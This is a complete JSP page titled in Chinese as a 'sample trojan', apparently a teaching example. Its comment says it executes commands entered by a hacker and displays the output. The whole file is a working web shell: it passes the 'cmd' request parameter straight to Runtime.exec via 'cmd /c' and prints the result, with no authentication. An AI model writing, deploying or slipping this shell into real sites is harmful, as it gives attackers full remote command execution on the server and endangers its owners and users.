<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ page import="java.io.*"%>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>JSP版示例木马</title>
</head>
<body>
<!-- 可以执行黑客输入的命令，并将命令的返回结果显示在网页上 -->

<% 
String cmd = request.getParameter("cmd");

Process process = Runtime.getRuntime().exec("cmd /c "+cmd);
String result = new String(process.getInputStream().readAllBytes());
%>

<pre>
<%=result %>
</pre>

</body>
</html>
